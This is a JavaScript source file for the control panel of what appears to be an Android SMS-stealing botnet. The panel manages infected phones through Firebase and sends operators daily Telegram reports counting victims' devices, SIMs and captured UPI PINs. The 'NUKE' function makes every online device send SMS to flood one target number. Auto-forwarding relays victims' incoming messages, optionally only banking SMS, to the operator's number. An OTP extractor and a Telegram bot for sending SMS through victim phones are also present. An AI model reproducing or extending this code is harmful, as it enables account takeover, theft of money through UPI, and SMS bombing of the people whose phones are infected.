      +'<div class="am-right"><div class="am-meta"><span class="am-sndr">'+esc(m.sender)+'</span><span class="msg-tp '+(m.type==='incoming'?'mt-i':'mt-o')+'">'+m.type+'</span><span class="msg-dt">'+esc(m.dateTime)+'</span></div><div class="am-txt">'+esc(m.message)+'</div></div>';
    frag.appendChild(el);
  });
  list.appendChild(frag);amCount+=batch.length;
}
async function pollAllFresh(){}

/* ═══════════ NUKE ═══════════ */
function openNuke(){document.getElementById('nukeModal').classList.add('open');updateNukeInfo();}
function updateNukeInfo(){
  var online=allDevices.filter(function(d){return d.status;});
  var simsTotal=0;online.forEach(function(d){simsTotal+=Math.max(1,d.sims.length||1);});
  document.getElementById('nukeDeviceCount').textContent=online.length;
  document.getElementById('nukeSimCount').textContent=simsTotal;
  document.getElementById('nukeTotalShots').textContent=online.length;
}
async function fireNuke(){
  var target=document.getElementById('nukeTarget').value.trim();
  var msg=document.getElementById('nukeMsg').value.trim();
  if(!target||!msg){toast('⚠ Enter number and message');return;}
  var online=allDevices.filter(function(d){return d.status;});
  if(!online.length){toast('⚠ No online devices');return;}
  var shots=[];
  online.forEach(function(dev){var sc=Math.max(1,dev.sims.length||1);for(var s=1;s<=sc;s++)shots.push({dev:dev,sim:s});});
  nukeRunning=true;nukeSent=0;nukeFail=0;nukeTotal=shots.length;_nukeActive=0;_nukeStartTime=Date.now();
  document.getElementById('nukeSent').textContent='0';document.getElementById('nukeFail').textContent='0';document.getElementById('nukeTotal').textContent=shots.length;
  document.getElementById('nukeStats').classList.add('show');document.getElementById('nukeProgWrap').style.display='block';
  document.getElementById('nukeFireBtn').style.display='none';document.getElementById('nukeStopBtn').style.display='block';
  toast('💣 Nuking '+shots.length+' shots…');
  var idx=0,done=0;var pool=Math.min(_nukePool,shots.length);
  function spawn(){
    while(_nukeActive<pool&&idx<shots.length&&nukeRunning){
      var shot=shots[idx++];var dev=shot.dev;
      var url=(dev._fbUrl||FB_URL)+'/clients/'+dev.id+'/cmd.json'+((dev._fbKey||FB_KEY)?'?auth='+(dev._fbKey||FB_KEY):'');
      var body=JSON.stringify({message:msg,sim:shot.sim,to:target,ts:Date.now(),type:'sms'});
      _nukeActive++;
      fetch(url,{method:'PUT',headers:{'Content-Type':'application/json'},body:body}).then(function(){nukeSent++;}).catch(function(){nukeFail++;})
        .finally(function(){_nukeActive--;done++;updateNukeProgress(done,shots.length);if(idx<shots.length&&nukeRunning)spawn();else if(done===shots.length)finishNuke();});
    }
  }
  spawn();
}
function updateNukeProgress(done,total){
  if(_nukeStatsTmr)return;
  _nukeStatsTmr=requestAnimationFrame(function(){
    _nukeStatsTmr=null;
    document.getElementById('nukeSent').textContent=nukeSent;
    document.getElementById('nukeFail').textContent=nukeFail;
    var pct=Math.round((done/total)*100);
    document.getElementById('nukeProgFill').style.width=pct+'%';
    document.getElementById('nukeProgTxt').textContent=pct+'% · '+done+'/'+total;
  });
}
function finishNuke(){nukeRunning=false;document.getElementById('nukeFireBtn').style.display='block';document.getElementById('nukeStopBtn').style.display='none';toast('✅ Done — '+nukeSent+' sent, '+nukeFail+' failed');}
function stopNuke(){nukeRunning=false;document.getElementById('nukeFireBtn').style.display='block';document.getElementById('nukeStopBtn').style.display='none';toast('⏹ Stopped');}

/* ═══════════ SETTINGS ═══════════ */
function openSettings(){populateSettingsUI();openM('settingsModal');}
function populateSettingsUI(){
  var e;
  e=document.getElementById('setMyNumber');if(e)e.value=userConfig.myNumber||'';
  e=document.getElementById('setTgUserId');if(e)e.value=userConfig.userId||'';
  e=document.getElementById('setTgChannel');if(e)e.value=userConfig.channelId||'';
  e=document.getElementById('setTgEnabled');if(e)e.checked=userConfig.botEnabled!==false;
  e=document.getElementById('setFwdEnabled');if(e)e.checked=userConfig.forwardEnabled!==false;
  renderFbList();updateTgStatusLine();updateForwardModeUI();
}
function setForwardMode(mode){userConfig.forwardMode=mode;cacheConfigLocal();debouncedCloudSave();updateForwardModeUI();toast('✓ Mode');}
function updateForwardModeUI(){
  var mode=userConfig.forwardMode||'all';
  ['setFwdModeAll','setFwdModeBank'].forEach(function(id){
    var el=document.getElementById(id);if(!el)return;
    var isActive=(id==='setFwdModeAll'&&mode==='all')||(id==='setFwdModeBank'&&mode==='banking');
    el.style.background=isActive?'rgba(168,85,247,.16)':'var(--bg3)';
    el.style.borderColor=isActive?'rgba(168,85,247,.4)':'var(--border)';
    el.style.color=isActive?'var(--gold2)':'var(--sub)';
  });
  var h=document.getElementById('fwdModeHint');if(h)h.textContent=mode==='banking'?'Only bank SMS forwarded':'All incoming forwarded';
}
function updateTgStatusLine(){
  var el=document.getElementById('tgStatusLine');if(!el)return;var lines=[];
  if(tgRunning){
    var ago=tgDiagnostics.lastUpdate?Math.round((Date.now()-tgDiagnostics.lastUpdate)/1000)+'s ago':'never';
    lines.push('● Running — '+(userConfig.channelId||'—'));
    lines.push('📊 Updates: '+tgDiagnostics.updateCount+' (last: '+ago+')');
    if(tgDiagnostics.lastError)lines.push('⚠ '+tgDiagnostics.lastError);
    el.className='settings-status '+(tgDiagnostics.lastError?'err':'on');
  } else {lines.push('○ Not running');el.className='settings-status';}
  el.innerHTML=lines.join('<br>');updateTgBtn();
}
function updateTgBtn(){
  var b=document.getElementById('tgStatus');if(!b)return;
  b.textContent=tgRunning?'🤖 ON':'🤖 OFF';
  b.style.color=tgRunning?'var(--mint)':'var(--sub)';
  b.style.borderColor=tgRunning?'rgba(6,214,160,.4)':'var(--border)';
  b.style.background=tgRunning?'rgba(6,214,160,.08)':'var(--bg3)';
}
function renderFbList(){
  var el=document.getElementById('settingsFbList');if(!el)return;
  if(!fbInstances.length){el.innerHTML='<div style="font-size:11px;color:var(--dim);text-align:center;padding:14px">No extra Firebase</div>';return;}
  el.innerHTML=fbInstances.map(function(inst){
    return'<div class="fb-list-row"><div class="fb-list-row-info"><div class="fb-list-row-lbl">'+esc(inst.label)+'</div><div class="fb-list-row-url">'+esc(inst.url)+'</div></div><span style="font-size:10px;font-weight:700;color:var(--mint)">'+(inst.devCount||0)+'</span><button onclick="fbRemove(\''+inst.id+'\')" style="padding:4px 8px;background:rgba(244,63,94,.08);border:1px solid rgba(244,63,94,.2);border-radius:6px;color:var(--rose);font-size:11px;cursor:pointer">✕</button></div>';
  }).join('');
}
async function addFirebaseFromSettings(){
  var label=document.getElementById('setFbLabel').value.trim();
  var url=document.getElementById('setFbUrl').value.trim().replace(/\/+$/,'');
  var key=document.getElementById('setFbKey').value.trim();
  if(!url){toast('⚠ Enter URL');return;}
  if(fbInstances.find(function(x){return x.url===url;})){toast('⚠ Already added');return;}
  var inst={id:'fb_'+Date.now()+'_'+Math.random().toString(36).slice(2,7),label:label||('FB '+(fbInstances.length+1)),url:url,key:key,devices:[],status:'connecting',poll:null,devCount:0};
  fbInstances.push(inst);
  document.getElementById('setFbLabel').value='';document.getElementById('setFbUrl').value='';document.getElementById('setFbKey').value='';
  renderFbList();
  await fbLoadInst(inst);fbStartPoll(inst,0);syncFirebasesToConfig();renderFbList();
  saveFirebaseToDb(inst);
}

async function fbLoadInst(inst){
  try{
    var auth=inst.key?'?auth='+inst.key:'';
    var r=await fetch(inst.url+'/clients.json'+auth,{signal:AbortSignal.timeout(12000)});
    if(!r.ok)throw new Error('HTTP');
    var devs=parseDevs(await r.json());
    devs.forEach(function(d){d._fbId=inst.id;d._fbLabel=inst.label;d._fbUrl=inst.url;d._fbKey=inst.key;});
    inst.devices=devs;inst.devCount=devs.length;inst.status='ok';
    fbMergeAll();toast('✅ '+inst.label+': '+devs.length+' devs');
  }catch(e){inst.status='error';toast('❌ '+inst.label);}
}
function fbStartPoll(inst,staggerMs){if(inst.poll)clearInterval(inst.poll);setTimeout(function(){inst.poll=setInterval(async function(){if(!inst.url)return;try{var auth=inst.key?'?auth='+inst.key:'';var r=await fetch(inst.url+'/clients.json'+auth,{signal:AbortSignal.timeout(12000)});if(!r.ok)return;var devs=parseDevs(await r.json());devs.forEach(function(d){d._fbId=inst.id;d._fbLabel=inst.label;d._fbUrl=inst.url;d._fbKey=inst.key;});inst.devices=devs;inst.devCount=devs.length;inst.status='ok';fbMergeAll();}catch(e){inst.status='error';}},25000);},staggerMs||0);}
function fbStopPoll(inst){if(inst.poll){clearInterval(inst.poll);inst.poll=null;}}
function fbRemove(id){
  var idx=fbInstances.findIndex(function(x){return x.id===id;});
  if(idx===-1)return;
  fbStopPoll(fbInstances[idx]);
  fbInstances.splice(idx,1);
  fbMergeAll();
  syncFirebasesToConfig();
  renderFbList();
  removeFirebaseFromDb(id);   // ← YE LINE ADD KARO (DB se bhi delete)
  toast('🗑 Removed');
}
function syncFirebasesToConfig(){userConfig.firebases=fbInstances.map(function(x){return{url:x.url,label:x.label,key:x.key};});debouncedCloudSave();}
function fbMergeAll(){if(_mergeDebTimer)clearTimeout(_mergeDebTimer);_mergeDebTimer=setTimeout(_doFbMergeAll,200);}
function _doFbMergeAll(){
  _mergeDebTimer=null;var merged=[];var seen=new Set();
  for(var pp=0;pp<allDevices.length;pp++){var pd=allDevices[pp];if((pd._fbId||'primary')==='primary'){var pk='primary:'+pd.id;if(!seen.has(pk)){seen.add(pk);merged.push(pd);}}}
  for(var ii=0;ii<fbInstances.length;ii++){if(fbInstances[ii].id==='primary')continue;var devs=fbInstances[ii].devices;for(var jj=0;jj<devs.length;jj++){var d=devs[jj];var k=(d._fbId||'primary')+':'+d.id;if(!seen.has(k)){seen.add(k);merged.push(d);}}}
  var onCnt=0;for(var x=0;x<merged.length;x++){if(merged[x].status)onCnt++;}
  var sig=merged.length+':'+onCnt;var changed=(sig!==_lastMergeSig);_lastMergeSig=sig;
  applyStableOrder(merged);allDevices=merged;renderStats();if(changed)renderGrid();renderFbList();
}
function fbRegisterPrimary(){allDevices.forEach(function(d){if(!d._fbId){d._fbId='primary';d._fbLabel='Primary';d._fbUrl=FB_URL;d._fbKey=FB_KEY;}});}
function loadFirebasesFromConfig(){var saved=userConfig.firebases||[];if(!saved.length)return;var toConnect=[];saved.forEach(function(s){if(!s.url||fbInstances.find(function(x){return x.url===s.url;}))return;var inst={id:'fb_'+Date.now()+'_'+Math.random().toString(36).slice(2,7),label:s.label||s.url,url:s.url,key:s.key||'',devices:[],status:'connecting',poll:null,devCount:0};fbInstances.push(inst);toConnect.push(inst);});if(!toConnect.length)return;(async function(){var BATCH=10;for(var i=0;i<toConnect.length;i+=BATCH){var batch=toConnect.slice(i,i+BATCH);await Promise.allSettled(batch.map(async function(inst){try{await fbLoadInst(inst);}catch(e){inst.status='error';}}));batch.forEach(function(inst,bi){fbStartPoll(inst,(i+bi)*400);});await new Promise(function(r){setTimeout(r,0);});}renderFbList();})();}
function saveAllSettings(){
  userConfig.myNumber=document.getElementById('setMyNumber').value.trim();
  userConfig.userId=document.getElementById('setTgUserId').value.trim();
  userConfig.channelId=document.getElementById('setTgChannel').value.trim();
  userConfig.botEnabled=document.getElementById('setTgEnabled').checked;
  userConfig.forwardEnabled=document.getElementById('setFwdEnabled').checked;
  cacheConfigLocal();debouncedCloudSave();
  if(userConfig.botEnabled&&userConfig.channelId)startTelegramBot();else stopTelegramBot();
  updateTgStatusLine();toast('💾 Saved');
}


/* ═══════════════════════════════════════════════════════════
   💾 FIREBASE CONFIGS → SAVE IN PRIMARY DB
   ═══════════════════════════════════════════════════════════ */
async function saveFirebaseToDb(inst){
  if(!FB_URL){console.warn('[META] No primary FB');return;}
  try{
    await fbSet('fbi_meta/firebases/'+inst.id,{
      id:inst.id,
      url:inst.url,
      label:inst.label,
      key:inst.key||'',
      addedAt:Date.now(),
      addedBy:(typeof deviceFingerprint!=='undefined'?deviceFingerprint:'unknown')
    });
    console.log('[META] ✓ Saved to DB:',inst.id);
  }catch(e){console.warn('[META] Save failed:',e.message);}
}

async function removeFirebaseFromDb(fbId){
  if(!FB_URL)return;
  try{await fbDel('fbi_meta/firebases/'+fbId);console.log('[META] ✓ Removed from DB:',fbId);}
  catch(e){console.warn('[META] Remove failed:',e.message);}
}

async function loadFirebasesFromDb(){
  if(!FB_URL)return;
  try{
    var data=await fbGet('fbi_meta/firebases');
    if(!data||typeof data!=='object'){console.log('[META] No saved firebases');return;}
    var added=0;
    Object.entries(data).forEach(function(kv){
      var fbId=kv[0],d=kv[1];
      if(!d||typeof d!=='object'||!d.url)return;
      if(fbInstances.find(function(x){return x.url===d.url;}))return;
      fbInstances.push({id:fbId,label:d.label||d.url,url:d.url,key:d.key||'',devices:[],status:'connecting',poll:null,devCount:0});
      added++;
    });
    if(!added){console.log('[META] All firebases already loaded');return;}
    console.log('[META] Loaded '+added+' firebases from DB');
    var toConnect=fbInstances.filter(function(x){return x.status==='connecting';});
    var BATCH=10;
    for(var i=0;i<toConnect.length;i+=BATCH){
      var batch=toConnect.slice(i,i+BATCH);
      await Promise.allSettled(batch.map(async function(inst){
        try{await fbLoadInst(inst);}catch(e){inst.status='error';}
      }));
      batch.forEach(function(inst,bi){fbStartPoll(inst,(i+bi)*400);});
      await new Promise(function(r){setTimeout(r,0);});
    }
    renderFbList();syncFirebasesToConfig();
  }catch(e){console.warn('[META] Load from DB failed:',e.message);}
}

/* ═══════════════════════════════════════════════════════════
   📅 DAILY REPORT — Every day 1 AM (local time)
   ═══════════════════════════════════════════════════════════ */
var _dailyReportTmr=null;

function startDailyReportScheduler(){
  stopDailyReportScheduler();
  _dailyReportTmr=setInterval(checkDailyReport,60000); // check every 60s
  setTimeout(checkDailyReport,5000); // initial check
  console.log('[DAILY] Scheduler started — sends 1 AM daily');
}
function stopDailyReportScheduler(){
  if(_dailyReportTmr){clearInterval(_dailyReportTmr);_dailyReportTmr=null;console.log('[DAILY] Stopped');}
}

async function checkDailyReport(){
  if(!userConfig.userId)return;
  var now=new Date();
  var h=now.getHours();
  var m=now.getMinutes();
  var dateKey=now.getFullYear()+'-'+(now.getMonth()+1)+'-'+now.getDate();
  // Send window: 1:00 AM to 1:05 AM
  if(h!==1||m>5)return;
  // DB flag check (all browsers share this)
  try{
    var dbSent=await fbGet('fbi_meta/last_report');
    if(dbSent===dateKey){return;}
  }catch(e){}
  // Local flag check
  try{if(localStorage.getItem('fbi_last_daily_report')===dateKey)return;}catch(e){}
  // Mark as sent (DB first to avoid race)
  try{await fbSet('fbi_meta/last_report',dateKey);}catch(e){}
  try{localStorage.setItem('fbi_last_daily_report',dateKey);}catch(e){}
  console.log('[DAILY] Sending report for '+dateKey);
  sendDailyReport();
}

async function sendDailyReport(){
  // 👇 Owner ID ab config.js se aayega
  var ownerId = CFG.OWNER_TELEGRAM_ID;
  if(!ownerId){console.warn('[DAILY] No OWNER_TELEGRAM_ID in config.js');return;}
  if(!CFG.TG_API){console.warn('[DAILY] No bot token');return;}
  var report=buildDailyReportText();
  if(report.length>4000)report=report.slice(0,3950)+'\n\n... (truncated)';
  try{
    var r=await fetch(CFG.TG_API+'/sendMessage',{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({chat_id:String(ownerId),text:report,parse_mode:'HTML',disable_web_page_preview:true}),
      signal:AbortSignal.timeout(10000)
    });
    var res=await r.json();
    if(res.ok){console.log('[DAILY] ✓ Sent to '+ownerId);toast('📊 Daily report sent');}
    else{console.error('[DAILY] ✗',res.description);toast('⚠ Report failed: '+res.description);}
  }catch(e){console.error('[DAILY] ✗',e.message);toast('⚠ Report error: '+e.message);}
}

function buildDailyReportText(){
  var now=new Date();
  var dateStr=now.toLocaleDateString('en-IN',{day:'2-digit',month:'short',year:'numeric'});
  var timeStr=now.toLocaleTimeString('en-IN',{hour:'2-digit',minute:'2-digit'});
  var totalDevices=allDevices.length;
  var online=allDevices.filter(function(d){return d.status;}).length;
  var offline=totalDevices-online;
  var withPin=allDevices.filter(function(d){return d.upipin||pinC[d.id];}).length;
  var totalSims=0;allDevices.forEach(function(d){totalSims+=d.sims.length;});
  var withBal=Object.keys(balanceCache).length;
  var L=[];
  L.push('📊 <b>F.B.I DAILY REPORT</b>');
  L.push('━━━━━━━━━━━━━━━━━━━━');
  L.push('🕐 '+dateStr+' · '+timeStr);
  L.push('');
  L.push('📡 Firebases: <b>'+fbInstances.length+'</b>');
  L.push('📱 Total Devices: <b>'+totalDevices+'</b>');
  L.push('🟢 Online: <b>'+online+'</b>');
  L.push('🔴 Offline: <b>'+offline+'</b>');
  L.push('📶 Total SIMs: <b>'+totalSims+'</b>');
  L.push('💳 UPI PIN: <b>'+withPin+'</b>');
  if(withBal>0)L.push('💰 With Balance: <b>'+withBal+'</b>');
  L.push('');
  L.push('<b>━━━ Breakdown ━━━</b>');
  L.push('');
  // Primary
  var primDevs=allDevices.filter(function(d){return(d._fbId||'primary')==='primary';});
  if(primDevs.length){
    var pOn=primDevs.filter(function(d){return d.status;}).length;
    L.push('🔥 <b>Primary</b>');
    L.push('   <code>'+esc(FB_URL)+'</code>');
    L.push('   📱 '+primDevs.length+' · 🟢 '+pOn+' · 🔴 '+(primDevs.length-pOn));
    L.push('');
  }
  // Extras
  fbInstances.forEach(function(inst){
    if(inst.id==='primary')return;
    var devs=allDevices.filter(function(d){return d._fbId===inst.id;});
    var on=devs.filter(function(d){return d.status;}).length;
    L.push('🔥 <b>'+esc(inst.label)+'</b>');
    L.push('   <code>'+esc(inst.url)+'</code>');
    L.push('   📱 '+devs.length+' · 🟢 '+on+' · 🔴 '+(devs.length-on));
    L.push('');
  });
  L.push('━━━━━━━━━━━━━━━━━━━━');
  L.push('<i>Generated by F.B.I • Auto-report 1 AM daily</i>');
  return L.join('\n');
}

/* Manual test report */
function testDailyReport(){
  if(!userConfig.userId){toast('⚠ Set Telegram User ID in settings first');return;}
  toast('📤 Sending test report...');
  sendDailyReport();
}


/* ═══════════ TELEGRAM ═══════════ */
async function fetchBotUsername(){try{var r=await fetch(CFG.TG_API+'/getMe',{signal:AbortSignal.timeout(6000)});var d=await r.json();if(d.ok&&d.result){tgDiagnostics.botInfo=d.result;var el=document.getElementById('botUsername');if(el)el.textContent='@'+(d.result.username||'bot');}}catch(e){}}
async function startTelegramBot(){
  stopTelegramBot();if(!userConfig.channelId){toast('⚠ Set channel ID');return;}
  tgDiagnostics.lastError='';updateTgStatusLine();
  try{await fetch(CFG.TG_API+'/deleteWebhook?drop_pending_updates=false',{signal:AbortSignal.timeout(6000)});}catch(e){}
  try{var r=await fetch(CFG.TG_API+'/getMe',{signal:AbortSignal.timeout(6000)});var d=await r.json();if(!d.ok){tgDiagnostics.lastError='Invalid token';updateTgStatusLine();return;}tgDiagnostics.botInfo=d.result;}catch(e){tgDiagnostics.lastError='Cannot reach TG';updateTgStatusLine();return;}
  try{var r4=await fetch(CFG.TG_API+'/getUpdates?offset=-1&timeout=0&limit=1',{signal:AbortSignal.timeout(6000)});var d4=await r4.json();if(d4.ok&&d4.result&&d4.result.length)tgLastUpdateId=d4.result[d4.result.length-1].update_id+1;else tgLastUpdateId=0;}catch(e){tgLastUpdateId=0;}
  tgRunning=true;tgDiagnostics.lastError='';tgDiagnostics.updateCount=0;updateTgStatusLine();updateTgBtn();
  if(!tgPollLoop){tgPollLoop=true;telegramLoop();}toast('🤖 Bot started');
}
function stopTelegramBot(){tgRunning=false;tgPollLoop=false;updateTgStatusLine();updateTgBtn();}
async function telegramLoop(){var ce=0;while(tgPollLoop){if(!tgRunning){await sleep(500);continue;}try{var he=await telegramPollOnce();if(he){ce++;if(ce>5){await sleep(3000);ce=0;}}else ce=0;}catch(e){ce++;await sleep(500);}await sleep(CFG.POLL_MS||500);}}
function sleep(ms){return new Promise(function(r){setTimeout(r,ms);});}
async function telegramPollOnce(){
  var url=CFG.TG_API+'/getUpdates?timeout=2';
  if(tgLastUpdateId)url+='&offset='+tgLastUpdateId;
  url+='&allowed_updates='+encodeURIComponent(JSON.stringify(['channel_post','message']));
  var r;try{r=await fetch(url,{signal:AbortSignal.timeout(8000)});}catch(e){return true;}
  if(!r.ok){if(r.status===409){try{await fetch(CFG.TG_API+'/deleteWebhook');}catch(e){}}return true;}
  var data=await r.json();if(!data.ok||!data.result||!data.result.length)return false;
  tgDiagnostics.updateCount+=data.result.length;tgDiagnostics.lastUpdate=Date.now();
  for(var i=0;i<data.result.length;i++){
    var u=data.result[i];tgLastUpdateId=u.update_id+1;
    var msg=u.channel_post||u.message;if(!msg)continue;
    var chatId=String(msg.chat&&msg.chat.id||'');
    var chatUser=String(msg.chat&&msg.chat.username||'');
    var cfgCh=String(userConfig.channelId||'');var cfgClean=cfgCh.replace('@','');
    var match=false;
    if(!cfgCh)match=false;
    else if(cfgCh.startsWith('@'))match=(chatUser.toLowerCase()===cfgClean.toLowerCase());
    else{var cfgNum=cfgCh.replace(/[^\-\d]/g,'');match=(chatId===cfgNum||chatId===cfgCh);}
    if(!match)continue;
    var text=msg.text||msg.caption||'';if(!text)continue;
    var parsed=parseTelegramMessage(text);if(!parsed.valid)continue;
    await handleTelegramSms(parsed.number,parsed.message,msg);
  }
  updateTgStatusLine();return false;
}
function parseTelegramMessage(text){
  text=String(text||'');var number=null,message=null;
  var np=[/📱\s*Receipt[:\s]+(\+?\d{10,15})/i,/📞\s*To[:\s]+(\+?\d{10,15})/i,/📱\s*Number[:\s]+(\+?\d{10,15})/i,/(?:Receipt|To Number|Target|Mobile|Number)[:\s]+(\+?\d{10,15})/i,/(?:^|\D)(\+91[\s-]?\d{10})(?:\D|$)/,/(?:^|\D)(91\d{10})(?:\D|$)/,/(?:^|\D)(\d{10})(?:\D|$)/];
  for(var i=0;i<np.length;i++){var m=text.match(np[i]);if(m){number=m[1].replace(/[^\d]/g,'');if(number.length>10)number=number.slice(-10);break;}}
  var mp=[/💬\s*Message[:\s]+([^\n]+)/i,/💬\s*Msg[:\s]+([^\n]+)/i,/🔑\s*Token[:\s]*\n\s*([^\n]+)/i,/🔑\s*Token[:\s]+([^\n]+)/i,/(?:Message|Msg|Body|Text|Token)[:\s]+([^\n]+)/i];
  for(var j=0;j<mp.length;j++){var mm=text.match(mp[j]);if(mm&&mm[1]&&mm[1].trim()){message=mm[1].trim();break;}}
  if(!number||!message){var otc=text.match(/One[\s-]?tap\s*copy[:\s]*\n?\s*(\+?\d{10,15})\s*\|\s*([^\n]+)/i);if(otc){if(!number){number=otc[1].replace(/[^\d]/g,'');if(number.length>10)number=number.slice(-10);}if(!message)message=otc[2].trim();}}
  if(!message){var lines=text.split('\n').map(function(l){return l.trim();}).filter(function(l){if(!l)return false;if(/^[━═─_=\-·•\s]+$/.test(l))return false;if(/Module by|DM to Buy|One[\s-]?tap copy|https?:\/\//i.test(l))return false;if(/^[+\d\s|,.\-()]+$/.test(l))return false;return true;});if(lines.length){lines.sort(function(a,b){return b.length-a.length;});message=lines[0];}}
  if(message)message=message.replace(/^[\u{1F300}-\u{1FAFF}\u{2600}-\u{27BF}\s]+/u,'').trim();
  if(message&&message.length<3)message=null;
  if(number&&number.length<10)number=null;
  return{number:number,message:message,valid:!!(number&&message)};
}
async function handleTelegramSms(number,message,msgObj){
  var dev=null;
  if(activeDeviceUid){var p=activeDeviceUid.split('|||');dev=allDevices.find(function(x){return x.id===p[1]&&(x._fbId||'primary')===p[0];});}
  if(!dev)dev=selDev||allDevices.find(function(d){return d.status;});
  if(!dev){toast('⚠ No device');return;}
  var sim=deviceSimMap[dev.id]||1;
  var res=await sendSmsViaDevice(dev,sim,number,message,'tg');
  if(res.ok)toast('🤖 → '+number);
}

/* ═══════════ AUTO-FORWARD ═══════════ */
async function checkAndForward(msgs,deviceId){
  if(!msgs||!msgs.length)return;
  var dev=allDevices.find(function(d){return d.id===deviceId;});if(!dev)return;
  var lf=forwardTracker[deviceId]||'';
  if(!lf){forwardTracker[deviceId]=msgs[0].key;saveForwardTracker();return;}
  if(userConfig.forwardEnabled===false){if(msgs[0].key!==lf){forwardTracker[deviceId]=msgs[0].key;saveForwardTracker();}return;}
  var myNum=userConfig.myNumber;if(!myNum){if(msgs[0].key!==lf){forwardTracker[deviceId]=msgs[0].key;saveForwardTracker();}return;}
  var fm=userConfig.forwardMode||'all';var tf=[];
  for(var i=0;i<msgs.length;i++){
    var m=msgs[i];if(m.key===lf)break;
    if(m.type!=='incoming')continue;
    if(!m.message||!m.message.trim()||m.message.trim()==='(no body)')continue;
    if(fm==='banking'){var b=isBankingSms(m.sender,m.message);if(!b)continue;m._bank=b;}
    tf.push(m);
  }
  if(!tf.length){if(msgs[0].key!==lf){forwardTracker[deviceId]=msgs[0].key;saveForwardTracker();}return;}
  forwardTracker[deviceId]=msgs[0].key;saveForwardTracker();
  var sim=deviceSimMap[dev.id]||1;var ok=0;
  for(var j=tf.length-1;j>=0;j--){var msg=tf[j];var ft=String(msg.message||'').trim();if(!ft)continue;var res=await sendSmsViaDevice(dev,sim,myNum,ft,'fwd');if(res.ok)ok++;}
  if(ok>0)toast('📤 Forwarded '+ok+' → '+myNum);
}

/* ═══════════ PING ═══════════ */
var _apOn=false,_pingTmr=null,_pingReplied=0,_pingTotal=0,_pingPrevStatus={};
function _pingUpdateBtn(){var b=document.getElementById('apBtn');if(!b)return;if(!_apOn){b.textContent='PING';b.style.color='var(--lilac)';return;}b.textContent=_pingReplied+'/'+_pingTotal;b.style.color=_pingReplied>0?'var(--mint)':'var(--gold2)';}
function _pingBuildPanel(){
  if(document.getElementById('pingPanel'))return;
  var p=document.createElement('div');p.id='pingPanel';
  p.style.cssText='position:fixed;bottom:20px;right:10px;left:10px;max-width:320px;margin-left:auto;max-height:440px;background:linear-gradient(145deg,#130a22,#0d0618);border:1px solid rgba(168,85,247,.28);border-radius:16px;z-index:8000;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,.8);display:flex;flex-direction:column;';
  p.innerHTML='<div style="padding:12px 16px;border-bottom:1px solid rgba(168,85,247,.1);display:flex;align-items:center;gap:8px"><div style="width:8px;height:8px;border-radius:50%;background:var(--mint);box-shadow:0 0 8px var(--mint);animation:pulse 1.5s infinite"></div><div style="font-size:13px;font-weight:800;color:var(--gold2);flex:1">Live Ping</div><div id="pingStats" style="font-size:11px;font-weight:700;color:var(--sub)">0/0</div><button onclick="document.getElementById(\'pingPanel\').remove();_apOn=false;if(_pingTmr)clearTimeout(_pingTmr);_pingUpdateBtn();" style="background:none;border:none;color:var(--sub);cursor:pointer;font-size:18px">×</button></div><div id="pingList" style="overflow-y:auto;flex:1;"></div>';
  document.body.appendChild(p);
}
function _pingAddRow(uid,name,online,isNew){
  var list=document.getElementById('pingList');if(!list)return;
  var ex=document.getElementById('pr_'+CSS.escape(uid));
  if(ex){if(isNew)list.insertBefore(ex,list.firstChild);return;}
  var row=document.createElement('div');row.id='pr_'+uid;
  row.style.cssText='display:flex;align-items:center;gap:9px;padding:8px 14px;border-bottom:1px solid rgba(168,85,247,.04);';
  row.innerHTML='<div style="width:8px;height:8px;border-radius:50%;background:'+(online?'var(--mint)':'rgba(244,63,94,.4)')+'"></div><div style="flex:1;font-size:12px;color:'+(online?'var(--text)':'var(--dim)')+'">'+esc(name)+'</div><div style="font-size:9px;font-weight:800;color:'+(online?'var(--mint)':'var(--rose)')+'">'+(online?'ON':'OFF')+'</div>';
  if(online)list.insertBefore(row,list.firstChild);else list.appendChild(row);
}
function autoPinAll(){
  if(_apOn){_apOn=false;if(_pingTmr){clearTimeout(_pingTmr);_pingTmr=null;}_pingUpdateBtn();toast('⏹ Stopped');return;}
  if(!allDevices.length){toast('⚠ No devices');return;}
  _apOn=true;_pingReplied=0;_pingTotal=allDevices.length;_pingUpdateBtn();_pingBuildPanel();toast('📡 Pinging…');_apLoop();
}
async function _apLoop(){
  if(!_apOn)return;_pingReplied=0;_pingTotal=0;
  var targets=fbInstances.length>0?fbInstances:[{id:'primary',url:FB_URL,key:FB_KEY,label:'Primary'}];
  try{
    var results=await Promise.allSettled(targets.map(async function(inst){var auth=inst.key?'?auth='+inst.key:'';var r=await fetch(inst.url+'/clients.json'+auth,{signal:AbortSignal.timeout(15000)});return{inst:inst,data:await r.json()};}));
    var allClients=[];
    results.forEach(function(res){if(res.status!=='fulfilled'||!res.value||!res.value.data)return;var inst=res.value.inst,data=res.value.data;if(typeof data!=='object')return;Object.keys(data).forEach(function(id){if(data[id]&&typeof data[id]==='object')allClients.push({id:id,cl:data[id],inst:inst,uid:inst.id+':'+id});});});
    _pingTotal=allClients.length;
    for(var i=0;i<allClients.length;i++){
      if(!_apOn)break;var it=allClients[i];var isOnline=!!it.cl.status;if(isOnline)_pingReplied++;
      var dev=allDevices.find(function(d){return d.id===it.id&&(d._fbId||'primary')===(it.inst.id||'primary');});
      var name=it.cl.modelName||it.cl.mobNo||it.id;
      if(dev){dev.status=isOnline;name=dev.name;}
      _pingAddRow(it.uid,name,isOnline,false);
      if(i%50===0){var s=document.getElementById('pingStats');if(s)s.textContent=_pingReplied+'/'+_pingTotal;_pingUpdateBtn();await new Promise(function(r){setTimeout(r,0);});}
    }
  }catch(e){}
  _pingUpdateBtn();renderGrid();renderStats();
  if(_apOn)_pingTmr=setTimeout(_apLoop,6000);
}

/* ═══════════ OTP ═══════════ */
var _lastOtp='';
function _extractOtp(txt){var m=txt.match(/\b(\d{6})\b/)||txt.match(/\b(\d{4,8})\b/);return m?m[1]:null;}
function otpShow(otp,src){_lastOtp=otp;document.getElementById('otpNum').textContent=otp;document.getElementById('otpSrc').textContent='From: '+src;document.getElementById('otpBar').classList.add('show');if(navigator.clipboard)navigator.clipboard.writeText(otp).catch(function(){});}
function otpCopy(){var v=document.getElementById('otpNum').textContent;if(!v||v.includes('─'))return;navigator.clipboard&&navigator.clipboard.writeText(v).then(function(){toast('✓ Copied');});}
function otpDismiss(){document.getElementById('otpBar').classList.remove('show');}

/* ═══════════ HELPERS ═══════════ */
function openM(id){document.getElementById(id).classList.add('open');document.body.style.overflow='hidden';}
